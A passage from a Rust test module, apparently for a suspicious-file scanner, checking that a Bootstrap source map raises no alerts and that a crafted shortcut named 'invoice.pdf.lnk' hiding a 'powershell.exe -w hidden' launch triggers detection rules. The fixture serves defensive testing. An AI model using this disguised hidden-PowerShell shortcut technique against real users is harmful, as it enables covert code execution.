            r#"{"sources":["../../scss/mixins/_reboot.scss"],"names":["Safari\\","Opera\\"]}"#;
        assert!(ids(css_map, "bootstrap.css.map").await.is_empty());
    }

    #[tokio::test]
    async fn shortcut_text_is_read_from_utf16() {
        let mut lnk = vec![0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00];
        lnk.extend([0u8; 68]);
        for u in "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden"
            .encode_utf16()
        {
            lnk.extend(u.to_le_bytes());
        }
        let text = crate::analyzers::heuristic_text(&lnk);
        assert!(text.contains("powershell.exe -w hidden"));
        let found = ids(&text, "invoice.pdf.lnk").await;
        assert!(found.contains(&"SCRIPT_401".to_string()));
        assert!(found.contains(&"SCRIPT_103".to_string()));
    }
}
